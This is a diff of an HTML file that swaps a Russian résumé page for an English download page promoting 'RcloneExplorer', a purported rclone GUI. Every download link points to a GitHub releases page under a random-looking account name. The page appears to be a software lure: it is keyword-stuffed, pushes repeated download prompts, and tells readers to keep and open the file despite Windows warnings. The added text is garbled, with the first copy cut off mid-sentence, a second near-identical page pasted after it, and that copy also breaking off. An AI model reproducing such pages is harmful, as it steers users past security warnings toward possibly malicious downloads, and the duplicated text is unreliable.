@@ -1,81 +1,593 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Артем Мышин — Резюме</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RcloneExplorer – Modern Portable rclone GUI for Windows 10/11</title>
+<meta name="description" content="RcloneExplorer is a modern, portable rclone GUI for Windows 10/11. Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ cloud services with a simple point-and-click interface.">
+<meta name="keywords" content="cloud-storage-sync, rclone, rclone-backup, rclone-browser, rclone-client, rclone-config, rclone-configuration, rclone-crypt, rclone-gui, rclone-linux, rclone-mount, rclone-sync">
+<meta name="robots" content="index, follow">
+<meta name="author" content="RcloneExplorer">
+<link rel="canonical" href="https://github.com/Vikkysurmounted714/RcloneExplorer">
+<meta property="og:type" content="website">
+<meta property="og:title" content="RcloneExplorer – Modern Portable rclone GUI for Windows 10/11">
+<meta property="og:description" content="Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ clouds with a friendly Windows app.">
+<meta property="og:url" content="https://github.com/Vikkysurmounted714/RcloneExplorer">
+<meta property="og:site_name" content="RcloneExplorer">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="RcloneExplorer – Modern Portable rclone GUI for Windows 10/11">
+<meta name="twitter:description" content="A friendly Windows app for browsing, transferring and syncing 70+ cloud storage services.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: #22303f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 28px 20px 70px;
+  }
+  h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    color: #0f2740;
+    letter-spacing: -0.5px;
+    margin: 18px 0 14px;
+  }
+  h2 {
+    font-size: 1.4rem;
+    line-height: 1.35;
+    color: #0f2740;
+    margin: 0 0 14px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.08rem;
+    color: #17324d;
+    margin: 22px 0 8px;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #1f6feb; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e3ebf3;
+    border-radius: 14px;
+    padding: 26px 28px;
+    margin: 0 0 26px;
+    box-shadow: 0 6px 18px rgba(16, 42, 67, 0.06);
+  }
+  .hero {
+    text-align: center;
+    padding: 40px 28px 36px;
+  }
+  .hero p.lead {
+    font-size: 1.09rem;
+    color: #3c4f62;
+    max-width: 640px;
+    margin: 0 auto 24px;
+  }
+  .cta {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff6b35 0%, #f7444e 55%, #c2185b 100%);
+    color: #ffffff !important;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.12rem;
+    padding: 17px 38px;
+    border-radius: 999px;
+    box-shadow: 0 10px 22px rgba(199, 44, 74, 0.32);
+    letter-spacing: 0.2px;
+  }
+  .cta.small {
+    font-size: 1rem;
+    padding: 15px 30px;
+    background: linear-gradient(135deg, #1f8ef1 0%, #6c5ce7 100%);
+    box-shadow: 0 10px 22px rgba(63, 81, 181, 0.3);
+  }
+  .cta-label {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: #64748b;
+  }
+  .pill {
+    display: inline-block;
+    background: #eef4fb;
+    border: 1px solid #d7e5f5;
+    color: #1c4a75;
+    border-radius: 999px;
+    padding: 5px 14px;
+    font-size: 0.82rem;
+    font-weight: 600;
+    margin: 0 6px 8px 0;
+  }
+  .note {
+    background: #f0f8f4;
+    border-left: 4px solid #2fa36b;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 0 0 18px;
+    font-size: 0.97rem;
+    color: #24513c;
+  }
+  .step {
+    background: #f8fbff;
+    border: 1px solid #e0ecf8;
+    border-radius: 10px;
+    padding: 16px 18px;
+    margin-bottom: 14px;
+  }
+  .step strong { color: #0f2740; }
+  .grid { display: flex; flex-wrap: wrap; gap: 12px; margin: 0 0 8px; }
+  .grid .box {
+    flex: 1 1 220px;
+    background: #f8fbff;
+    border: 1px solid #e0ecf8;
+    border-radius: 10px;
+    padding: 14px 16px;
+    font-size: 0.95rem;
+  }
+  .box strong { display: block; color: #0f2740; margin-bottom: 4px; }
+  .faq-item { margin-bottom: 20px; }
+  .faq-item p { margin: 6px 0 0; color: #3f5265; }
+  footer {
+    text-align: center;
+    font-size: 0.85rem;
+    color: #7b8a99;
+    padding-top: 6px;
+  }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.22rem; }
+    .card { padding: 20px 18px; }
+    .hero { padding: 30px 16px 26px; }
+    .cta { font-size: 1rem; padding: 15px 24px; }
+    body { font-size: 16px; }
+  }
+</style>
 </head>
-<body style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 30px; color: #222; line-height: 1.5;">
+<body>
+<div class="page">
 
-    <a href="Артем_Мышин_Резюме.pdf" download style="display: inline-block; background: #0056b3; color: white; padding: 8px 15px; border-radius: 4px; text-decoration: none; font-size: 14px; margin-bottom: 20px;">Скачать PDF-версию</a>
+  <header class="card hero">
+    <h1>☁️ RcloneExplorer - Manage All Your Cloud Files Easily</h1>
+    <p class="lead">RcloneExplorer is a modern, portable rclone GUI for Windows 10/11. Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ clouds — all from one friendly window, with no command lines and no confusing settings.</p>
+    <a class="cta" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">⬇️ Download RcloneExplorer for Windows</a>
+    <span class="cta-label">Visit this link to download the application.</span>
+  </header>
 
-    <h1 style="font-size: 28px; margin-bottom: 5px; color: #111;">Артем Мышин</h1>
-    <p style="font-size: 16px; margin-top: 0;"><strong>Payment Support · Technical Support · Analyst</strong></p>
-    <p style="color: #555;">Санкт-Петербург · Готов к удаленной работе</p>
-
-    <div style="background: #f4f6f8; padding: 15px; border-radius: 5px; margin: 20px 0; font-size: 14px;">
-        <strong>Контакты:</strong><br>
-        Email: <a href="mailto:pfvfhfirf@gmail.com" style="color: #0056b3;">pfvfhfirf@gmail.com</a> | 
-        Telegram: <a href="https://t.me/IshuRabotuAgain" target="_blank" style="color: #0056b3;">@IshuRabotuAgain</a> | 
-        Телефон: +7 (921) 403-56-96
+  <section class="card">
+    <h2>🚀 What Is RcloneExplorer?</h2>
+    <p>RcloneExplorer is a desktop application that puts a clean, easy-to-use window in front of rclone — a powerful tool that connects to more than 70 cloud storage services. Instead of typing commands, you simply click on your files and folders the same way you would in File Explorer on Windows.</p>
+    <p>If you have ever kept files in more than one place — a Google Drive account for work, a personal OneDrive, a Dropbox folder shared with family, or an archive sitting in pCloud or Amazon S3 — you already know the frustration of switching between browser tabs and apps. RcloneExplorer brings all of those places together in a single screen so you can see what you have, move things around, and keep everything up to date.</p>
+    <p>It is portable, which means it does not clutter your computer with a long installation process. You keep it in one folder, open it when you need it, and close it when you are done. Your cloud accounts, your settings, and your file lists live in that same tidy location, so you always know where everything is.</p>
+    <div class="grid">
+      <div class="box"><strong>No command line</strong>Point, click, and drag files between clouds.</div>
+      <div class="box"><strong>Portable design</strong>Keep it on a USB stick or in a folder.</div>
+      <div class="box"><strong>70+ providers</strong>Google Drive, OneDrive, Dropbox, pCloud, S3 and many more.</div>
+      <div class="box"><strong>Built for Windows</strong>Designed for Windows 10 and Windows 11 desktops.</div>
     </div>
+  </section>
 
-    <p>Специалист с 8+ годами опыта в сфере клиентского сервиса, технической поддержки (1-я и 2-я линия), модерации данных и аналитики. Опыт работы в мультиязычных командах (EN C1) и сопровождения IT / EdTech проектов.</p>
+  <section class="card">
+    <h2>✨ Key Features You Will Use Every Day</h2>
+    <ul>
+      <li><strong>Browse every cloud in one place.</strong> Open a side-by-side view of two different storage providers and see your folders just like on your own hard drive.</li>
+      <li><strong>Drag-and-drop transfers.</strong> Move a folder from Google Drive to OneDrive, or copy photos from your PC to pCloud, without ever opening a web browser.</li>
+      <li><strong>One-way and two-way sync.</strong> Keep a local folder and a cloud folder matching each other automatically, or make a cloud folder mirror a local one.</li>
+      <li><strong>Backup-friendly workflow.</strong> Copy important folders to a second cloud so a single outage or accident never costs you your files.</li>
+      <li><strong>Encrypted storage support.</strong> If you already use encrypted remotes, RcloneExplorer recognises them and works with them like any other folder.</li>
+      <li><strong>Clear progress and results.</strong> See transfer speed, file counts, and any skipped files in plain language instead of scrolling through technical logs.</li>
+      <li><strong>Saved configurations.</strong> Set up each cloud account once and it stays ready for next time.</li>
+      <li><strong>Mount a cloud as a drive.</strong> Work with remote files as though they were on a lettered drive on your own computer.</li>
+    </ul>
+  </section>
 
-    <h2 style="font-size: 20px; border-bottom: 2px solid #0056b3; padding-bottom: 5px; margin-top: 30px; color: #0056b3;">Опыт работы</h2>
-
-    <div style="margin-bottom: 25px;">
-        <div style="float: right; color: #666; font-size: 14px;">Август 2024 — Наст. время</div>
-        <h3 style="font-size: 16px; margin-bottom: 3px;">Преподаватель</h3>
-        <div style="font-style: italic; color: #555; margin-bottom: 8px;">Онлайн-школа «Тетрика» · Москва</div>
-        <p style="font-size: 14px; margin: 0;">Фоновая работа, которой обеспечивал себя, пока пытался развиться как самостоятельный предприниматель и навайбкодить небольшую игру.</p>
+  <section class="card">
+    <h2>💾 Download and Setup</h2>
+    <p>Getting RcloneExplorer onto your computer takes only a moment. There is no complicated wizard, no account registration, and no long list of decisions to make.</p>
+    <div class="step">
+      <strong>Step 1 — Go to the download page.</strong><br>
+      Visit the official releases page using the button below. This is the only place you should download RcloneExplorer from.
     </div>
-
-    <div style="margin-bottom: 25px;">
-        <div style="float: right; color: #666; font-size: 14px;">Октябрь 2023 — Август 2024</div>
-        <h3 style="font-size: 16px; margin-bottom: 3px;">1-man Support (Head of Support / 1-я и 2-я линия)</h3>
-        <div style="font-style: italic; color: #555; margin-bottom: 8px;">Лидгид · Санкт-Петербург</div>
-        <ul style="margin: 5px 0 15px 20px; font-size: 14px;">
-            <li>Единолично обслуживал отдел support'а в компании на 70+ активных сотрудников и более 7 000 клиентов.</li>
-            <li>По сути выполнял обязанности Head of Support и непосредственно 1-й и 2-й линий поддержки.</li>
-            <li>Самостоятельно контролировал количество и типы входящих обращений (почта, соцсети и иные каналы).</li>
-            <li>Обрабатывал обращения на 1-й линии либо привлекал профильных менеджеров / IT-специалистов для 2-й линии.</li>
-            <li>Собирал всю отчетность по обращениям и передавал в маркетинговый и клиентский отделы.</li>
-            <li>Вел мультиязыковую поддержку (английский, французский, испанский, португальский) в связи с широкой географией компании.</li>
-        </ul>
+    <div class="step">
+      <strong>Step 2 — Download the application.</strong><br>
+      Visit this link to download the application. Choose the newest release listed at the top of the page.
     </div>
-
-    <div style="margin-bottom: 25px;">
-        <div style="float: right; color: #666; font-size: 14px;">Август 2023 — Август 2024</div>
-        <h3 style="font-size: 16px; margin-bottom: 3px;">Саппорт, Менеджер по регистрациям</h3>
-        <div style="font-style: italic; color: #555; margin-bottom: 8px;">Лидгид · Санкт-Петербург</div>
-        <ul style="margin: 5px 0 15px 20px; font-size: 14px;">
-            <li>Выполнял задачи support-менеджера: решал вопросы клиентов на русском и иностранных языках в режиме 24/7.</li>
-            <li>В качестве менеджера по регистрациям проводил модерацию новых пользователей, оценивал риски и анализировал предоставленные данные.</li>
-            <li>Знакомил новых клиентов с особенностями работы на платформе.</li>
-        </ul>
+    <div class="step">
+      <strong>Step 3 — Open the application.</strong><br>
+      When the download has finished, open the file you just received. Because RcloneExplorer is portable, it starts straight away.
     </div>
-
-    <div style="margin-bottom: 25px;">
-        <div style="float: right; color: #666; font-size: 14px;">Декабрь 2021 — Август 2023</div>
-        <h3 style="font-size: 16px; margin-bottom: 3px;">Старший специалист по работе с клиентами</h3>
-        <div style="font-style: italic; color: #555; margin-bottom: 8px;">Okko · Санкт-Петербург</div>
-        <ul style="margin: 5px 0 15px 20px; font-size: 14px;">
-            <li>Первая линия поддержки (чаты, почта, соцсети).</li>
-            <li>Решение конфликтных вопросов, помощь в решении технических моментов.</li>
-        </ul>
+    <div class="step">
+      <strong>Step 4 — Connect your first cloud account.</strong><br>
+      Follow the on-screen prompts to sign in to the storage service you want to browse. Your browser may open briefly so you can approve access — this is normal and expected.
     </div>
+    <p style="text-align:center;margin:26px 0 6px;">
+      <a class="cta small" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">⬇️ Open the RcloneExplorer Releases Page</a>
+    </p>
+    <p class="note">Tip: bookmark the releases page. That way you will always find the newest version in one click, and you can come back to it later if you ever set up a second computer.</p>
+  </section>
 
-    <h2 style="font-size: 20px; border-bottom: 2px solid #0056b3; padding-bottom: 5px; margin-top: 30px; color: #0056b3;">Ключевые навыки</h2>
-    <div style="background: #f4f6f8; padding: 15px; border-radius: 5px; font-size: 14px;">
-        Customer Support, Technical Support, Atlassian Jira, CRM Systems, AAA (Authentication, Authorization, Accounting), Account Management, Customer Account Monitoring, Английский язык (C1 Advanced), Деловое общение и переписка, Работа с большим объемом информации, Обучение и развитие.
+  <section class="card">
+    <h2>🖱️ Your First Five Minutes</h2>
+    <p>Once the application is open, the window is split into simple areas. On one side you choose where you want to look, and in the middle you see your folders and files. Everything is designed so that a first-time user can get to work without reading a manual.</p>
+    <ol>
+      <li><strong>Pick a cloud.</strong> Click the name of the account you connected, such as Google Drive or OneDrive.</li>
+      <li><strong>Look around.</strong> Double-click folders to open them. The path at the top always shows exactly where you are.</li>
+      <li><strong>Select what you need.</strong> Click a single file, or hold the Shift key to select a range of files.</li>
+      <li><strong>Choose your destination.</strong> Switch the other side of the window to a different cloud or to a folder on your PC.</li>
+      <li><strong>Press the transfer button.</strong> A progress bar shows how much is left. You can keep browsing while it works.</li>
+    </ol>
+    <p>There is no wrong move to make here. Browsing and selecting files never changes anything on your cloud accounts — files only move or change when you deliberately start a copy, move, or sync task.</p>
+  </section>
+
+  <section class="card">
+    <h2>☁️ Cloud Services You Can Connect</h2>
+    <p>RcloneExplorer supports the same wide range of providers as rclone itself, which means more than 70 services are available to you. The most popular ones for everyday users include:</p>
+    <div style="margin-bottom:14px;">
+      <span class="pill">Google Drive</span>
+      <span class="pill">OneDrive</span>
+      <span class="pill">Dropbox</span>
+      <span class="pill">pCloud</span>
+      <span class="pill">Amazon S3</span>
+      <span class="pill">Backblaze B2</span>
+      <span class="pill">Mega</span>
+      <span class="pill">Box</span>
+      <span class="pill">Google Photos</span>
+      <span class="pill">WebDAV</span>
+      <span class="pill">SFTP</span>
+      <span class="pill">FTP</span>
+      <span class="pill">Microsoft Azure Blob</span>
+      <span class="pill">Cloudflare R2</span>
+      <span class="pill">Wasabi</span>
+      <span class="pill">Yandex Disk</span>
     </div>
+    <p>You can connect as many accounts as you like, including two separate accounts on the same service — for example, a work Google Drive and a personal Google Drive. They appear as separate entries in your list, so files never get mixed up by accident.</p>
+  </section>
 
-    <h2 style="font-size: 20px; border-bottom: 2px solid #0056b3; padding-bottom: 5px; margin-top: 30px; color: #0056b3;">Образование</h2>
-    <div style="margin-bottom: 25px;">
-        <div style="float: right; color: #666; font-size: 14px;">2015</div>
-        <h3 style="font-size: 16px; margin-bottom: 3px;">Государственная полярная академия, Санкт-Петербург</h3>
-        <div style="font-style: italic; color: #555;">Филологический факультет · Русский язык и литература (Высшее)</div>
+  <section class="card">
+    <h2>🔄 Transfer, Copy, and Sync — What Is the Difference?</h2>
+    <p>Three words appear throughout the app, and they mean slightly different things. Understanding them takes about thirty seconds and prevents most beginner mistakes.</p>
+    <ul>
+      <li><strong>Copy</strong> puts a duplicate of your selected files at the destination. The originals stay exactly where they were. This is the safest option and a good default for most people.</li>
+      <li><strong>Move</strong> takes the files from the source and places them at the destination. Use this when you are tidying up and do not want two copies.</li>
+      <li><strong>Sync</strong> makes the destination match the source. Files that exist only at the destination may be removed so the two sides look identical. Read the confirmation message before you accept.</li>
+    </ul>
+    <p>If you are ever unsure, choose copy. You can always delete the extra copy afterwards, but you cannot undo a file that was removed by mistake.</p>
+  </section>
+
+  <section class="card">
+    <h2>🔒 Is It Safe to Use?</h2>
+    <p>Yes. RcloneExplorer does not run its own cloud servers and does not hold your files in the middle. Your data moves directly between your computer and the storage provider you signed in to, using that provider's own secure connection.</p>
+    <p>Your account details and settings are stored on your own machine, in the folder where you keep RcloneExplorer. Nothing is uploaded to a third party. When you are finished, you can simply close the app — there is no background service left running.</p>
+    <p>Only download the application from the official releases page linked on this page. Software found on other websites may have been altered, and you should avoid those copies entirely.</p>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ If Something Does Not Work</h2>
+    <h3>The download does not start</h3>
+    <p>Make sure you are on the releases page and not on a search results page. Pick the newest release at the top of the list, then choose the Windows download offered there.</p>
+    <h3>Windows shows a warning when I open the app</h3>
+    <p>Windows sometimes flags newly downloaded files that it has not seen before. Check that the file came from the official releases page, then use the option to keep and open the file.</p>
+    <h3>My cloud account will not connect</h3>
+    <p>Close the sign-in window and try again. Some services ask you to approve access in your browser, so keep your default browser open<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RcloneExplorer – Modern Portable rclone GUI for Windows 10/11</title>
+<meta name="description" content="RcloneExplorer is a modern, portable rclone GUI for Windows 10/11. Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ cloud services with a simple point-and-click interface.">
+<meta name="keywords" content="cloud-storage-sync, rclone, rclone-backup, rclone-browser, rclone-client, rclone-config, rclone-configuration, rclone-crypt, rclone-gui, rclone-linux, rclone-mount, rclone-sync">
+<meta name="robots" content="index, follow">
+<meta name="author" content="RcloneExplorer">
+<link rel="canonical" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">
+<meta property="og:type" content="website">
+<meta property="og:title" content="RcloneExplorer – Modern Portable rclone GUI for Windows 10/11">
+<meta property="og:description" content="Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ clouds with a friendly Windows app.">
+<meta property="og:url" content="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">
+<meta property="og:site_name" content="RcloneExplorer">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="RcloneExplorer – Modern Portable rclone GUI for Windows 10/11">
+<meta name="twitter:description" content="A friendly Windows app for browsing, transferring and syncing 70+ cloud storage services.">
+<style>
+  * { box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f4f7fb;
+    color: #22303f;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 28px 20px 70px;
+  }
+  h1 {
+    font-size: 2.05rem;
+    line-height: 1.25;
+    color: #0f2740;
+    letter-spacing: -0.5px;
+    margin: 16px 0 14px;
+  }
+  h2 {
+    font-size: 1.38rem;
+    line-height: 1.35;
+    color: #0f2740;
+    margin: 0 0 14px;
+    letter-spacing: -0.2px;
+  }
+  h3 {
+    font-size: 1.06rem;
+    color: #17324d;
+    margin: 22px 0 6px;
+  }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  a { color: #1f6feb; }
+  .card {
+    background: #ffffff;
+    border: 1px solid #e3ebf3;
+    border-radius: 14px;
+    padding: 26px 28px;
+    margin: 0 0 24px;
+    box-shadow: 0 6px 18px rgba(16, 42, 67, 0.06);
+  }
+  .hero {
+    text-align: center;
+    padding: 40px 28px 34px;
+  }
+  .hero .lead {
+    font-size: 1.08rem;
+    color: #3c4f62;
+    max-width: 640px;
+    margin: 0 auto 24px;
+  }
+  .cta {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff6b35 0%, #f7444e 55%, #c2185b 100%);
+    color: #ffffff !important;
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 1.1rem;
+    padding: 17px 38px;
+    border-radius: 999px;
+    box-shadow: 0 10px 22px rgba(199, 44, 74, 0.32);
+    letter-spacing: 0.2px;
+  }
+  .cta.small {
+    font-size: 1rem;
+    padding: 15px 30px;
+    background: linear-gradient(135deg, #1f8ef1 0%, #6c5ce7 100%);
+    box-shadow: 0 10px 22px rgba(63, 81, 181, 0.3);
+  }
+  .cta-label {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.9rem;
+    color: #64748b;
+  }
+  .pill {
+    display: inline-block;
+    background: #eef4fb;
+    border: 1px solid #d7e5f5;
+    color: #1c4a75;
+    border-radius: 999px;
+    padding: 5px 14px;
+    font-size: 0.82rem;
+    font-weight: 600;
+    margin: 0 6px 8px 0;
+  }
+  .note {
+    background: #f0f8f4;
+    border-left: 4px solid #2fa36b;
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin: 0 0 6px;
+    font-size: 0.96rem;
+    color: #24513c;
+  }
+  .step {
+    background: #f8fbff;
+    border: 1px solid #e0ecf8;
+    border-radius: 10px;
+    padding: 15px 18px;
+    margin-bottom: 13px;
+  }
+  .step strong { color: #0f2740; }
+  .grid { display: flex; flex-wrap: wrap; gap: 12px; margin: 0; }
+  .grid .box {
+    flex: 1 1 210px;
+    background: #f8fbff;
+    border: 1px solid #e0ecf8;
+    border-radius: 10px;
+    padding: 14px 16px;
+    font-size: 0.94rem;
+  }
+  .box strong { display: block; color: #0f2740; margin-bottom: 3px; }
+  .faq h3 { margin-top: 18px; }
+  .faq p { margin: 4px 0 0; color: #3f5265; }
+  .center { text-align: center; margin: 24px 0 4px; }
+  footer {
+    text-align: center;
+    font-size: 0.85rem;
+    color: #7b8a99;
+    padding-top: 6px;
+  }
+  @media (max-width: 600px) {
+    h1 { font-size: 1.6rem; }
+    h2 { font-size: 1.2rem; }
+    .card { padding: 20px 18px; }
+    .hero { padding: 28px 16px 24px; }
+    .cta { font-size: 1rem; padding: 15px 24px; }
+    body { font-size: 16px; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+
+  <header class="card hero">
+    <h1>☁️ RcloneExplorer - Manage All Your Cloud Files Easily</h1>
+    <p class="lead">RcloneExplorer is a modern, portable rclone GUI for Windows 10/11. Browse, transfer and sync Google Drive, OneDrive, Dropbox, pCloud, S3 and 70+ clouds from one friendly window — no commands, no confusion.</p>
+    <a class="cta" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">⬇️ Download RcloneExplorer for Windows</a>
+    <span class="cta-label">Visit this link to download the application.</span>
+  </header>
+
+  <section class="card">
+    <h2>🚀 What Is RcloneExplorer?</h2>
+    <p>RcloneExplorer is a desktop application that puts a clean, easy-to-use window in front of rclone — a powerful tool that connects to more than 70 cloud storage services. Instead of typing commands, you click on your files and folders the same way you would in File Explorer on Windows.</p>
+    <p>If you keep files in more than one place — a Google Drive account for work, a personal OneDrive, a Dropbox folder shared with family, or an archive sitting in pCloud or Amazon S3 — you already know the frustration of switching between browser tabs and apps. RcloneExplorer brings all of those places together on a single screen so you can see what you have, move things around, and keep everything up to date.</p>
+    <p>It is portable, which means it does not clutter your computer with a long installation process. You keep it in one folder, open it when you need it, and close it when you are done. Your cloud accounts, your settings and your file lists live in that same tidy location, so you always know where everything is.</p>
+    <div class="grid">
+      <div class="box"><strong>No command line</strong>Point, click, and drag files between clouds.</div>
+      <div class="box"><strong>Portable design</strong>Keep it on a USB stick or in a plain folder.</div>
+      <div class="box"><strong>70+ providers</strong>Google Drive, OneDrive, Dropbox, pCloud, S3 and more.</div>
+      <div class="box"><strong>Built for Windows</strong>Designed for Windows 10 and Windows 11 desktops.</div>
     </div>
+  </section>
 
+  <section class="card">
+    <h2>✨ Key Features You Will Use Every Day</h2>
+    <ul>
+      <li><strong>Browse every cloud in one place.</strong> Open two storage providers side by side and see your folders just like on your own hard drive.</li>
+      <li><strong>Drag-and-drop transfers.</strong> Move a folder from Google Drive to OneDrive, or copy photos from your PC to pCloud, without opening a web browser.</li>
+      <li><strong>One-way and two-way sync.</strong> Keep a local folder and a cloud folder matching each other automatically, or make a cloud folder mirror a local one.</li>
+      <li><strong>Backup-friendly workflow.</strong> Copy important folders to a second cloud so a single outage or accident never costs you your files.</li>
+      <li><strong>Encrypted storage support.</strong> If you already use encrypted remotes, RcloneExplorer recognises them and works with them like any other folder.</li>
+      <li><strong>Clear progress and results.</strong> See transfer speed, file counts and any skipped files in plain language instead of scrolling through technical logs.</li>
+      <li><strong>Saved configurations.</strong> Set up each cloud account once and it stays ready for next time.</li>
+      <li><strong>Mount a cloud as a drive.</strong> Work with remote files as though they were a lettered drive on your own computer.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>💾 Download and Setup</h2>
+    <p>Getting RcloneExplorer onto your computer takes only a moment. There is no complicated wizard, no account registration and no long list of decisions to make.</p>
+    <div class="step">
+      <strong>Step 1 — Go to the download page.</strong><br>
+      Visit the official releases page using the button below. This is the only place you should download RcloneExplorer from.
+    </div>
+    <div class="step">
+      <strong>Step 2 — Download the application.</strong><br>
+      Visit this link to download the application. Choose the newest release listed at the top of the page.
+    </div>
+    <div class="step">
+      <strong>Step 3 — Open the application.</strong><br>
+      When the download has finished, open the file you just received. Because RcloneExplorer is portable, it starts straight away.
+    </div>
+    <div class="step">
+      <strong>Step 4 — Connect your first cloud account.</strong><br>
+      Follow the on-screen prompts to sign in to the storage service you want to browse. Your browser may open briefly so you can approve access — this is normal and expected.
+    </div>
+    <p class="center">
+      <a class="cta small" href="https://github.com/Vikkysurmounted714/RcloneExplorer/releases">⬇️ Open the RcloneExplorer Releases Page</a>
+    </p>
+    <p class="note">Tip: bookmark the releases page. That way you always find the newest version in one click, and you can come back to it later if you ever set up a second computer.</p>
+  </section>
+
+  <section class="card">
+    <h2>🖱️ Your First Five Minutes</h2>
+    <p>Once the application is open, the window is split into simple areas. On one side you choose where you want to look, and in the middle you see your folders and files. Everything is designed so a first-time user can get to work without reading a manual.</p>
+    <ol>
+      <li><strong>Pick a cloud.</strong> Click the name of the account you connected, such as Google Drive or OneDrive.</li>
+      <li><strong>Look around.</strong> Double-click folders to open them. The path at the top always shows exactly where you are.</li>
+      <li><strong>Select what you need.</strong> Click a single file, or hold the Shift key to select a range of files.</li>
+      <li><strong>Choose your destination.</strong> Switch the other side of the window to a different cloud or to a folder on your PC.</li>
+      <li><strong>Press the transfer button.</strong> A progress bar shows how much is left, and you can keep browsing while it works.</li>
+    </ol>
+    <p>There is no wrong move to make here. Browsing and selecting files never changes anything on your cloud accounts — files only move or change when you deliberately start a copy, move or sync task.</p>
+  </section>
+
+  <section class="card">
+    <h2>🌐 Cloud Services You Can Connect</h2>
+    <p>RcloneExplorer supports the same wide range of providers as rclone itself, which means more than 70 services are available to you. The most popular options for everyday users include:</p>
+    <div style="margin-bottom:14px;">
+      <span class="pill">Google Drive</span>
+      <span class="pill">OneDrive</span>
+      <span class="pill">Dropbox</span>
+      <span class="pill">pCloud</span>
+      <span class="pill">Amazon S3</span>
+      <span class="pill">Backblaze B2</span>
+      <span class="pill">Mega</span>
+      <span class="pill">Box</span>
+      <span class="pill">Google Photos</span>
+      <span class="pill">WebDAV</span>
+      <span class="pill">SFTP</span>
+      <span class="pill">FTP</span>
+      <span class="pill">Azure Blob</span>
+      <span class="pill">Cloudflare R2</span>
+      <span class="pill">Wasabi</span>
+      <span class="pill">Yandex Disk</span>
+    </div>
+    <p>You can connect as many accounts as you like, including two separate accounts on the same service — for example, a work Google Drive and a personal Google Drive. They appear as separate entries in your list, so files never get mixed up by accident.</p>
+  </section>
+
+  <section class="card">
+    <h2>🔄 Copy, Move and Sync — What Is the Difference?</h2>
+    <p>Three words appear throughout the app, and they mean slightly different things. Understanding them takes about thirty seconds and prevents most beginner mistakes.</p>
+    <ul>
+      <li><strong>Copy</strong> puts a duplicate of your selected files at the destination. The originals stay exactly where they were. This is the safest option and a good default for most people.</li>
+      <li><strong>Move</strong> takes the files from the source and places them at the destination. Use this when you are tidying up and do not want two copies.</li>
+      <li><strong>Sync</strong> makes the destination match the source. Files that exist only at the destination may be removed so both sides look identical. Read the confirmation message before you accept.</li>
+    </ul>
+    <p>If you are ever unsure, choose copy. You can always delete the extra copy afterwards, but you cannot undo a file that was removed by mistake.</p>
+  </section>
+
+  <section class="card">
+    <h2>🔒 Is It Safe to Use?</h2>
+    <p>Yes. RcloneExplorer does not run its own cloud servers and does not hold your files in the middle. Your data moves directly between your computer and the storage provider you signed in to, using that provider's own secure connection.</p>
+    <p>Your account details and settings are stored on your own machine, in the folder where you keep RcloneExplorer. Nothing is uploaded to a third party. When you are finished, close the app — there is no background service left running.</p>
+    <p>Only download the application from the official releases page linked on this page. Software found on other websites may have been altered, and you should avoid those copies entirely.</p>
+  </section>
+
+  <section class="card faq">
+    <h2>🛠️ If Something Does Not Work</h2>
+    <h3>The download does not start</h3>
+    <p>Make sure you are on the releases page and not a search results page. Pick the newest release at the top of the list, then use the Windows download offered there.</p>
+    <h3>Windows shows a warning when I open the app</h3>
+    <p>Windows sometimes flags newly downloaded files it has not seen before. Check that the file came from the official releases page, then use the option to keep and open the file.</p>
+    <h3>My cloud account will not connect</h3>
+    <p>Close the sign-in window and try again. Some services ask you to approve access in your browser, so keep your default browser open until the approval finishes.</p>
+    <h3>A transfer stopped halfway</h3>
